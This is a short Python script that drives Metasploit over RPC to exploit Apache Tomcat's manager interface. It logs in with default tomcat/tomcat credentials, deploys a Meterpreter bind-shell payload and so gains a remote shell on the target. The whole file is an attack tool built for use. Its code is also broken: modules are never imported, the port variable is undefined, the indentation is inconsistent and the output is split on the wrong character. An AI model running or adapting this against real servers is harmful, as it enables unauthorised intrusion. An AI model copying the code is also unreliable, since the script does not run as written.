# -*- encoding: utf-8 -*-
import msfrpc
import time

def exploit(RHOST, RPORT):
	client = msfrpc.Msfrpc({})
	client.login('msf', 'password')
	ress = client.call('console.create')
	console_id = ress['id']

	## Exploit TOMCAT MANAGER  ##
	commands = """use exploit/multi/http/tomcat_mgr_deploy
	set PATH /manager
	set HttpUsername tomcat
	set HttpPassword tomcat
	set RHOST """+RHOST+"""
	set RPORT """+RPORT+"""
	set payload java/meterpreter/bind_tcp
	exploit
	"""

	print("[+] Exploiting TOMCAT MANAGER on: "+RHOST)
	client.call('console.write',[console_id,commands])
	res = client.call('console.read',[console_id])
	result = res['data'].split('n')
 
def main():
	parser = optparse.OptionParser(sys.argv[0] +' -h RHOST  -p LPORT')
	parser.add_option('-h', dest='RHOST', type='string',  help='Specify a remote host')
	parser.add_option('-p', dest='LPORT', type='string', help ='specify a port to listen ')
	(options, args) = parser.parse_args()
	
	RHOST=options.RHOST
	LPORT=options.LPORT
	
	if (RHOST == None) and (RPORT == None):
		print(parser.usage)
		sys.exit(0)
 
    exploit(RHOST, RPORT)
 
if __name__ == "__main__":
      main()
